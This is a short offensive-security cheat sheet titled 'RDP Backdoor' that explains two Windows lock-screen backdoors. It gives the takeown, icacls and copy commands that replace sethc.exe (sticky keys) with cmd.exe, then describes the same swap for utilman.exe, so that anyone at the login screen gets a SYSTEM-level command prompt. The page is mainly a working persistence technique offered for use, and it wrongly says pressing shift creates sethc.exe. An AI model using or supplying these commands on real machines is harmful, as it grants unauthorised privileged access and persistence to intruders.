# RDP Backdoor

## Sticky keys
Sticky keys allow you to press the buttons of a combination sequentially instead of at the same time. 

1. Press shift 5 times to launch the window. This will create a binary in `C:\Windows\System32\sethc.exe` which we can alter from the log in screen.
[Sticky Keys](Images/sticky-keys.png)

2. Take ownership of `sethc.exe` and grant the current user permissions to modify it.

```sh
takeown /f c:\windows\system32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant Administrator:F
copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
```

3. Lock your session via the sign out menu
4. Press shift 5 times to access a terminal with SYSTEM privileges.

## Utilman
Built in application to provide ease of access options during the lock screen.

1. Replace `C:\windows\system32\utilman.exe` with `cmd.exe`
2. Repeat the above process to take ownership
3. Lock the computer and press the ease of access to gain a prompt.
